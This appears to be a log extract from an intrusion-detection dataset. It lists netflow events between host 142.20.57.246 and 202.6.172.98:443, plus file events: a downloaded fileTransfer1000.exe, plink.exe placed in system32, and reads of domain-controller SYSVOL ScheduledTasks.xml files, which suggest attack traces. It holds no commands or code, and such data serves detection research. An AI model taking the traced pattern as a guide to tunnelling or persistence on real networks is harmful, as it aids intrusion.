e4e82d48-24f1-463f-b1d4-0726da49edb4,{'netflow': '142.20.57.246:53886->202.6.172.98:443'},845825
481d25a9-e48e-4f76-9d4b-d8957a56db74,{'netflow': '202.6.172.98:443->142.20.57.246:53374'},829443
a9a2fcaf-360b-4990-b87e-80beb3f4d729,{'netflow': '202.6.172.98:443->142.20.57.246:54003'},860165
aedd2f1e-b26f-421e-a6b5-6a1f8837025f,{'netflow': '202.6.172.98:443->142.20.57.246:53497'},841734
cde4f5b1-4307-41f2-9efc-a93cdab87124,{'netflow': '202.6.172.98:443->142.20.57.246:53916'},847880
4fcad323-3c36-4a01-a061-9d4df14bd885,{'netflow': '202.6.172.98:443->142.20.57.246:53342'},827405
90a9b961-6b5c-4b39-b681-ddf04ebee97c,{'netflow': '142.20.57.246:53953->202.6.172.98:443'},854031
98fb2caa-7bd9-4ba7-b092-1ac39ca373f7,{'netflow': '142.20.57.246:53395->202.6.172.98:443'},831505
1cebb8a3-2e5a-4c1f-8974-26d7715b1292,{'netflow': '142.20.57.246:53396->202.6.172.98:443'},831506
07f8c39c-35c1-41fa-8fee-2b760d8aef73,{'netflow': '202.6.172.98:443->142.20.57.246:53396'},831507
99e6a26d-a468-4c61-b0a2-35d98c11ff4c,{'netflow': '202.6.172.98:443->142.20.57.246:53395'},831508
339de211-f0e6-4993-b875-36cbfbdbed22,{'netflow': '202.6.172.98:443->142.20.57.246:53953'},854033
cd3f1262-6eb0-45b0-80fe-2b79f13cbc63,{'netflow': '142.20.57.246:53994->202.6.172.98:443'},858136
6c174d5d-8a1c-488e-acc4-15142c230f01,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier'},94234
22d0c03b-e456-4d37-90e8-c56f9e595ba4,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE'},81949
86bb811b-f10f-4622-814a-208d11db8b5f,{'netflow': '202.6.172.98:443->142.20.57.246:53443'},835614
df70af23-36ea-4896-be53-83af174f909b,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE'},81950
4adaddec-76ed-448e-8a5e-e1e3e9095bed,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE'},81951
f5fa4ed6-9098-4730-a6df-5e59e788803f,{'netflow': '142.20.57.246:53938->202.6.172.98:443'},852001
7600f93c-80c7-4380-acbe-32d4f53fce4b,{'netflow': '142.20.57.246:54004->202.6.172.98:443'},860194
1e93b5c6-fb36-4001-8e8e-0fccb2d90b8a,{'netflow': '202.6.172.98:443->142.20.57.246:53886'},845860
900c4f6a-5c0f-4d44-bc09-9c763fdf60a2,{'netflow': '202.6.172.98:443->142.20.57.246:54004'},860201
fc355157-ad9e-463c-82ad-182d2a118bc7,{'netflow': '142.20.57.246:53964->202.6.172.98:443'},856105
79bda6ec-5a99-4174-8663-92e45e36a762,{'netflow': '142.20.57.246:50054->202.6.172.98:443'},811052
cc57f9bb-6833-4291-b999-0a2752aff6a8,{'netflow': '142.20.57.246:50055->202.6.172.98:443'},811053
8d4d22d3-3e8b-4fac-abd5-319a5a664c31,{'netflow': '142.20.57.246:53444->202.6.172.98:443'},835629
a0f55bbb-90eb-48eb-b4ea-ad8051b97784,{'netflow': '202.6.172.98:443->142.20.57.246:53444'},835630
8691f983-b87b-4a98-8dd3-514f0a7fdf9d,{'netflow': '142.20.57.246:53498->202.6.172.98:443'},841779
7a588254-d92a-4fb4-b6f1-3d7f1708d8c2,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml'},79926
c5b88743-7c1d-42be-928d-ea47a475bfd8,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'},79927
5132cc12-cb42-432b-ae4f-c7cf75eab33a,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml'},79929
076ffe7b-b8e1-4930-bf7e-b90bbe0408ea,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml'},79930
82226793-784e-49c1-87ae-917681619a96,{'netflow': '202.6.172.98:443->142.20.57.246:50055'},811067
d9e15e75-d690-4f5f-9ac0-87f7b9e6868b,{'netflow': '142.20.57.246:53924->202.6.172.98:443'},849979
9110e798-803e-4625-98ac-b5040c55ec08,{'netflow': '202.6.172.98:443->142.20.57.246:50054'},811069
f0e32e83-ac03-434b-bbd2-524fc08e5098,{'netflow': '202.6.172.98:443->142.20.57.246:53498'},841788
994749a5-a6f7-4b2d-a96c-1dc359cfd355,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml'},79934
40c1ab8e-885c-416e-b24a-3d1bc50c8ed0,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml'},79931
8c768a8e-8357-4c59-b512-9b185a1bc51d,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'},79935
8a191106-fafc-429d-a37a-3cf709b69d97,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml'},79936
ad7cf995-37d0-44c6-9561-f3f874fc35d7,{'netflow': '142.20.57.246:53284->202.6.172.98:443'},823364
cc21e8b3-f78d-43d5-ad5f-089056f3ec52,{'netflow': '202.6.172.98:443->142.20.57.246:53964'},856136
5e456fdf-5448-41a2-860e-9d19c3d60708,{'netflow': '202.6.172.98:443->142.20.57.246:53284'},823368
e9821895-3636-4c05-8369-3ca755333fcf,{'netflow': '142.20.57.246:54005->202.6.172.98:443'},860244
66ee4c41-c428-4030-a793-4565ce37f5be,{'netflow': '202.6.172.98:443->142.20.57.246:53994'},858199
0820b9a8-4c4b-4363-8808-310d121b3a72,{'netflow': '202.6.172.98:443->142.20.57.246:51149'},815197
7be10927-c26e-4eb5-8071-ef099a7ad8d9,{'netflow': '142.20.57.246:53887->202.6.172.98:443'},845921
c6b45579-557e-4265-8567-621530f0ff8f,{'netflow': '202.6.172.98:443->142.20.57.246:53938'},852068
2cb9358d-99a8-48a3-8265-cbf6cd65e450,{'netflow': '142.20.57.246:53311->202.6.172.98:443'},825446
ef779a13-8b22-449e-9178-53f96dc58848,{'netflow': '202.6.172.98:443->142.20.57.246:53887'},845926
3c339e74-581d-423b-8f68-194a703ad17f,{'netflow': '142.20.57.246:53393->202.6.172.98:443'},831594
905e4ec1-dd8c-49d5-a9a2-8df315508a56,{'netflow': '142.20.57.246:53470->202.6.172.98:443'},837740
d3ea53c6-9867-4b06-a36e-a770b6db19f5,{'netflow': '142.20.57.246:53485->202.6.172.98:443'},839792
1fa3a7cd-c0a3-4593-9219-123d1dffe33b,{'netflow': '142.20.57.246:53445->202.6.172.98:443'},835697
7548c5e8-aa50-43a7-923d-94850fe9bc44,{'netflow': '142.20.57.246:53375->202.6.172.98:443'},829554
a37a567a-77d2-4801-886c-e79b367b05ef,{'netflow': '142.20.57.246:53285->202.6.172.98:443'},823414
9385e52e-ce98-46a9-99f1-e0e732711ae9,{'netflow': '202.6.172.98:443->142.20.57.246:53485'},839799
133c3f6e-757d-4691-b3a4-b90f8de831ef,{'netflow': '202.6.172.98:443->142.20.57.246:53470'},837757
9d2b6e84-cc5d-46e3-a554-d5e903878dd5,{'netflow': '142.20.57.246:53289->202.6.172.98:443'},823423
41928abe-8d5e-42d7-ad46-85270dde780b,{'netflow': '202.6.172.98:443->142.20.57.246:53285'},823428
4ead1bd0-d65b-4af8-93fc-adf367eba955,{'netflow': '142.20.57.246:53954->202.6.172.98:443'},854149
ec637527-01dc-41fc-b5b1-73c0ef067fc9,{'netflow': '202.6.172.98:443->142.20.57.246:53289'},823432
76e28b05-4ea2-4b1e-96c1-f28a220b2332,{'netflow': '202.6.172.98:443->142.20.57.246:53311'},825483
9f2b06dc-a3d2-49b7-82e7-402963494739,{'netflow': '202.6.172.98:443->142.20.57.246:53375'},829589
8c949cd4-62a5-44c0-854c-5383714d8e0f,{'netflow': '202.6.172.98:443->142.20.57.246:53445'},835734
dd8cf0ab-9df7-4bda-9b8f-f692a57c5158,{'netflow': '202.6.172.98:443->142.20.57.246:53954'},854167
f6200107-2419-4cba-bce8-2d1325366d91,{'netflow': '142.20.57.246:53433->202.6.172.98:443'},833701
16af85ad-a129-4ae7-a150-f5559912b87c,{'netflow': '142.20.57.246:53446->202.6.172.98:443'},835749
68c37032-3e80-486b-8e91-d8a64dbbbd7a,{'netflow': '142.20.57.246:49997->202.6.172.98:443'},809130
1effe0e3-eff6-4dce-a579-5ae5f2ae8d46,{'netflow': '202.6.172.98:443->142.20.57.246:53433'},833709
93b8d809-6257-49f5-a7b5-3c0ad4c9b11a,{'netflow': '142.20.57.246:53965->202.6.172.98:443'},856243
ce94c797-08dd-4359-9449-347b5ddf7f25,{'netflow': '142.20.57.246:53917->202.6.172.98:443'},848055
4af8e30a-f454-477d-8c5d-e06af182a82c,{'netflow': '202.6.172.98:443->142.20.57.246:53924'},850105
9bd2a2d1-c3e6-4b09-b602-c22b160b5f4e,{'netflow': '142.20.57.246:49982->202.6.172.98:443'},807098
b1964757-60a0-4cca-a417-ea0c21c8fb23,{'netflow': '202.6.172.98:443->142.20.57.246:49982'},807101
8a89d245-e24b-4871-8138-e5f9647ebb42,{'netflow': '142.20.57.246:53394->202.6.172.98:443'},831678
12e50444-9e42-4d4c-acad-6d4caf38236f,{'netflow': '142.20.57.246:53343->202.6.172.98:443'},827585
f62f18a4-c393-4e52-8ac9-3f700a9ba52d,{'netflow': '202.6.172.98:443->142.20.57.246:53965'},856260
c75d3c83-0b4c-47ad-ba85-f9d039a60983,{'netflow': '142.20.57.246:53499->202.6.172.98:443'},841925
548aea15-a08a-46bc-b6b0-6f2e091ed82b,{'netflow': '202.6.172.98:443->142.20.57.246:49997'},809157
98e7344a-c23e-4652-909d-15cbcbf30288,{'netflow': '202.6.172.98:443->142.20.57.246:53917'},848072
5ad0d40d-e49a-4238-9e6d-b53eef28d74c,{'netflow': '142.20.57.246:53486->202.6.172.98:443'},839888
9bf167a2-1c8f-4958-986c-b1b875e732a2,{'netflow': '142.20.57.246:53874->202.6.172.98:443'},843984
5381127b-7cbe-498a-85b4-9e32fcc42b00,{'netflow': '202.6.172.98:443->142.20.57.246:53874'},843987
9d6c4201-4048-4d91-b61a-3b2444aea930,{'netflow': '202.6.172.98:443->142.20.57.246:51163'},815317
67f2007a-6c36-48df-ace7-05b07193650c,{'netflow': '202.6.172.98:443->142.20.57.246:53486'},839907
01618b3a-e621-46fb-a6af-6da6c8ffd48e,{'netflow': '202.6.172.98:443->142.20.57.246:54005'},860397
40956625-6f7e-4c41-ade6-d05d8622c8d9,{'netflow': '142.20.57.246:50056->202.6.172.98:443'},811245
e4e92432-3804-467f-96cd-31d1872cc04b,{'netflow': '142.20.57.246:50057->202.6.172.98:443'},811248
9ee8af1a-49d1-4347-96bf-4962bb0896f0,{'netflow': '142.20.57.246:49983->202.6.172.98:443'},807152
85f3a8c5-8bfd-44bf-a8df-8fe989ad31a7,{'netflow': '142.20.57.246:53399->202.6.172.98:443'},831735
836c1ca9-2cab-49b5-8be9-d7db69f722a5,{'netflow': '142.20.57.246:53312->202.6.172.98:443'},825592
91ed4b9c-7676-40c8-b009-891f9cc36982,{'netflow': '202.6.172.98:443->142.20.57.246:53399'},831737
71d0e5b5-e295-41eb-89ff-7d20a1edb884,{'netflow': '142.20.57.246:53313->202.6.172.98:443'},825593
2f2cb020-9c22-4b96-9e8f-ccfd439d3868,{'netflow': '202.6.172.98:443->142.20.57.246:53499'},841975
fd720d68-d5a6-40ec-a2ff-21e4bf714b39,{'netflow': '142.20.57.246:53290->202.6.172.98:443'},823554
1945ae83-6f03-4fe5-a05b-3d3c377c255a,{'netflow': '202.6.172.98:443->142.20.57.246:50056'},811266
26280caa-8aa8-4780-9359-faabfb671ee0,{'netflow': '202.6.172.98:443->142.20.57.246:53290'},823558
b1b553be-fa42-4054-b0af-2d17fdd8b1dc,{'netflow': '202.6.172.98:443->142.20.57.246:53446'},835852
63f932d6-0925-40d4-80e8-9240bcd8900d,{'netflow': '202.6.172.98:443->142.20.57.246:49983'},807187
bf6bb4ea-a78d-493b-b12b-80ee914007ec,{'netflow': '142.20.57.246:53888->202.6.172.98:443'},846101
e77a9ca1-00e4-426b-82a0-f04151d65d4e,{'file': '/Device/HarddiskVolume1/windows/system32/plink.exe'},100630
2b51748e-5826-4ba9-a68a-51ab0cf67eeb,{'netflow': '142.20.57.246:49971->202.6.172.98:443'},805144
bfcd3bb7-2157-4033-b2e5-3dd9753385dc,{'netflow': '142.20.57.246:53966->202.6.172.98:443'},856347
c6bcb9bd-67e5-4a16-860e-7916aea8c176,{'netflow': '142.20.57.246:53292->202.6.172.98:443'},823585
88b05cf8-1aa5-4e99-88c0-06032ee47f46,{'netflow': '202.6.172.98:443->142.20.57.246:53966'},856354
87f1ddc7-60d5-4ab9-b14a-7e1aa98be43d,{'netflow': '142.20.57.246:53376->202.6.172.98:443'},829734
aad3f358-4f15-47d1-ae5c-659e774bc9db,{'netflow': '142.20.57.246:53925->202.6.172.98:443'},850218
a6244db5-38de-4b2d-a8d3-cb0aba00b9b6,{'netflow': '142.20.57.246:53875->202.6.172.98:443'},844076
e776f152-bdba-4221-8e36-ccc51cc59a33,{'netflow': '202.6.172.98:443->142.20.57.246:53875'},844077
08ddb839-af03-4350-b919-231b1ae365ba,{'netflow': '202.6.172.98:443->142.20.57.246:53925'},850223
5b2b2ecf-39b0-4f24-aa21-0d2b9e853144,{'netflow': '142.20.57.246:53447->202.6.172.98:443'},835893
c7674ed1-64f5-4e02-b74d-2c599afec50a,{'netflow': '142.20.57.246:53500->202.6.172.98:443'},842040
e260ef04-8a17-4eeb-996c-be7cbd620b57,{'netflow': '202.6.172.98:443->142.20.57.246:53500'},842041
2e0a43fd-2e1c-492f-80b4-5167553e4031,{'netflow': '142.20.57.246:54006->202.6.172.98:443'},860476
148bd655-c5fd-420b-808c-da9d66c9c706,{'netflow': '142.20.57.246:53250->202.6.172.98:443'},821567
b4ebd7a5-1616-4cd3-9b17-9b0ef1ba1309,{'netflow': '142.20.57.246:53400->202.6.172.98:443'},831807
2d46366a-2da6-4e9e-b6a6-41f2e2412d75,{'netflow': '202.6.172.98:443->142.20.57.246:53400'},831808
30aef542-1780-4a89-9e64-6fd74da98bf6,{'netflow': '202.6.172.98:443->142.20.57.246:53447'},835906
e34e7fe5-a7c5-4f6e-8484-2c247a0fffdc,{'netflow': '142.20.57.246:53344->202.6.172.98:443'},827715
ad4d43b0-726a-44c1-8712-130b1091ee88,{'netflow': '202.6.172.98:443->142.20.57.246:53343'},827718
7ea47bfe-bdbc-4b16-b609-63e29b3ee1dc,{'netflow': '202.6.172.98:443->142.20.57.246:54006'},860491
8a12102d-794e-47fa-8ebf-ef2ba71f7b7b,{'netflow': '202.6.172.98:443->142.20.57.246:53344'},827727
9ca79e14-3032-4928-97e1-cb8195325b96,{'netflow': '142.20.57.246:53434->202.6.172.98:443'},833883
e27f860d-b4b2-452e-9c9a-2ccf0924d3ba,{'netflow': '202.6.172.98:443->142.20.57.246:53376'},829804
24d3ce08-86ed-40ec-8235-27bad9c89c79,{'netflow': '142.20.57.246:53471->202.6.172.98:443'},837996
bcfb1be8-d3ea-43e4-af2f-4c66941c8cde,{'netflow': '202.6.172.98:443->142.20.57.246:53888'},846188
86f73a05-4b54-4560-a195-d6df8d456aea,{'netflow': '202.6.172.98:443->142.20.57.246:50057'},811375
26c820e3-35a1-443a-83b0-2c055e507011,{'netflow': '202.6.172.98:443->142.20.57.246:53292'},823664
f43ef225-d6dd-47e8-93f9-d558980dfabc,{'netflow': '202.6.172.98:443->142.20.57.246:53313'},825710
fc5fc9bc-62a7-406d-a68e-f53f86a36561,{'netflow': '202.6.172.98:443->142.20.57.246:53889'},846194
fb50bcde-f6aa-4180-8b16-ce4822022376,{'netflow': '142.20.57.246:49998->202.6.172.98:443'},809328
67acbbae-747b-4699-8aef-c2f95dd27f30,{'netflow': '202.6.172.98:443->142.20.57.246:53312'},825711
6ea27b58-bcc0-48c0-829a-c01d2dd4f054,{'netflow': '142.20.57.246:53889->202.6.172.98:443'},846193
d331d035-7e4d-4e61-9da7-b5287ada68a0,{'netflow': '202.6.172.98:443->142.20.57.246:49971'},805241
489c07f8-0ca9-4a81-aa92-8b26f5fc5cf7,{'netflow': '142.20.57.246:53939->202.6.172.98:443'},852351
94c522c4-fad3-4c32-b56f-66eca9ff2a6c,{'netflow': '142.20.57.246:53926->202.6.172.98:443'},850308
4d7a244b-9cb0-4894-9092-570552676b58,{'netflow': '202.6.172.98:443->142.20.57.246:53434'},833926
76955263-c3eb-4ba2-8ab3-df287fd2a7bf,{'netflow': '142.20.57.246:53449->202.6.172.98:443'},835977
ee3586c6-ee43-45eb-a09a-af8304e7e9ed,{'netflow': '202.6.172.98:443->142.20.57.246:53449'},835982
02a89915-f713-4c12-8c8a-b92e051c1ada,{'netflow': '142.20.57.246:53995->202.6.172.98:443'},858511
d4d41711-66db-4618-8c3f-441fb3790ab3,{'netflow': '202.6.172.98:443->142.20.57.246:53471'},838033
43236e24-6987-4fce-a3a8-c5a57d59395b,{'netflow': '142.20.57.246:54009->202.6.172.98:443'},860565
8bbfcde2-d952-4c71-9300-8a6eac107799,{'netflow': '142.20.57.246:53918->202.6.172.98:443'},848279
51f6c07b-de89-42b4-a46f-62abff720e5f,{'netflow': '142.20.57.246:53501->202.6.172.98:443'},842144
3bfec792-ca60-4762-9947-9e1f6e271075,{'netflow': '202.6.172.98:443->142.20.57.246:53501'},842145
eec87c3e-6d10-4a2e-98b0-0ea4b5893755,{'netflow': '202.6.172.98:443->142.20.57.246:53939'},852396
e16e34ce-2269-4314-b31a-7afb9f585b85,{'netflow': '142.20.57.246:53487->202.6.172.98:443'},840116
9b332521-fbda-4734-98f7-ed8e8f171069,{'netflow': '142.20.57.246:53502->202.6.172.98:443'},842164
5be22fee-d9cf-4f28-aed2-5d4c9ffe5f61,{'netflow': '142.20.57.246:53876->202.6.172.98:443'},844213
bca9c58d-10ec-46d0-9087-3afdf1192065,{'netflow': '202.6.172.98:443->142.20.57.246:53487'},840119
ec2f6d4b-1bd3-4af5-9a88-7979221b030c,{'netflow': '142.20.57.246:49984->202.6.172.98:443'},807352
612bba5b-ad08-42b2-8af2-111c9767cedb,{'netflow': '202.6.172.98:443->142.20.57.246:49984'},807353
cce41aab-e64b-4afc-b6df-bb3aace2b4a9,{'netflow': '202.6.172.98:443->142.20.57.246:53502'},842171
937ac57e-cb4a-409b-8bc9-bc661f0442b4,{'netflow': '202.6.172.98:443->142.20.57.246:53250'},821699
21c248b5-d2d0-491e-9259-9a9cc2e31c4f,{'netflow': '202.6.172.98:443->142.20.57.246:53876'},844234
97ab645e-054e-44a2-a4db-982c5940fa4e,{'netflow': '142.20.57.246:53896->202.6.172.98:443'},846290
8d6385a7-51ae-4b6d-b01d-9262fdd562ba,{'netflow': '142.20.57.246:53314->202.6.172.98:443'},825814
f60dcdc7-93b6-4185-ad59-28ead7e2c6d5,{'netflow': '142.20.57.246:53967->202.6.172.98:443'},856535
df737f2d-bd10-4b10-bf19-4ab396633183,{'netflow': '202.6.172.98:443->142.20.57.246:53314'},825815
ca80dde6-98be-455b-aa92-b7c29136aea6,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe'},94679
a195e01f-f37f-46b3-a2fc-e97601c1b52d,{'netflow': '142.20.57.246:53955->202.6.172.98:443'},854497
75c8a2f3-04d9-4e34-893e-9effe3882fde,{'netflow': '202.6.172.98:443->142.20.57.246:53918'},848354
93ab979b-3252-4e76-9d23-71b01555c8bb,{'netflow': '142.20.57.246:53315->202.6.172.98:443'},825826
a7164ea8-b944-4192-bec1-8a90d6c9de18,{'netflow': '202.6.172.98:443->142.20.57.246:53896'},846306
35be02da-74a8-4dc3-b29a-b384cddd6d39,{'netflow': '202.6.172.98:443->142.20.57.246:53315'},825835
fb1bcdf1-2302-46e6-8b98-a4aaed2d2bc7,{'netflow': '202.6.172.98:443->142.20.57.246:53955'},854510
3d446335-e53e-4cfb-9131-08265e2d397f,{'netflow': '202.6.172.98:443->142.20.57.246:49998'},809459
f9126526-9679-43fd-ab9a-bfb7a085570b,{'netflow': '202.6.172.98:443->142.20.57.246:54009'},860673
98e35f45-9d72-409a-8f49-83ee9f73781a,{'netflow': '142.20.57.246:53401->202.6.172.98:443'},832001
553d85ae-28a4-4c7d-acf7-4f263853530d,{'netflow': '202.6.172.98:443->142.20.57.246:53401'},832007
6b628901-8c09-46f6-91c1-ee62fcf2bc96,{'netflow': '202.6.172.98:443->142.20.57.246:53995'},858633
edd558c3-67bc-4af0-943c-e79c725cb4a6,{'netflow': '202.6.172.98:443->142.20.57.246:53967'},856587
ca3c9475-fc80-41ee-b46a-5e07ffbbe8b6,{'netflow': '142.20.57.246:53316->202.6.172.98:443'},825872
c11c4087-5f9f-4b46-9fed-7e81187c4a61,{'netflow': '142.20.57.246:53472->202.6.172.98:443'},838161
e1f4e70f-e3e9-4daf-8646-d453c678a7e2,{'netflow': '142.20.57.246:53317->202.6.172.98:443'},825873
179b2eed-c4ef-4849-bc8a-90fa9f5872f2,{'netflow': '142.20.57.246:53318->202.6.172.98:443'},825875
d23047e2-ad5b-4899-b867-4e51cff360a7,{'netflow': '202.6.172.98:443->142.20.57.246:53317'},825876
dae5e0cb-27a3-4705-a5b3-cf728af1aa85,{'netflow': '202.6.172.98:443->142.20.57.246:53316'},825877
413a3588-76aa-477a-9232-b1e0bda5a89a,{'netflow': '142.20.57.246:53319->202.6.172.98:443'},825878
f75a5a66-1045-44f5-89d2-29c5b6b8566c,{'netflow': '142.20.57.246:53320->202.6.172.98:443'},825879
a1625067-c49d-4434-864e-848d86b73866,{'netflow': '202.6.172.98:443->142.20.57.246:53318'},825880
bfffe44a-1614-4c1d-bec8-ce9a68aba040,{'netflow': '202.6.172.98:443->142.20.57.246:53319'},825883
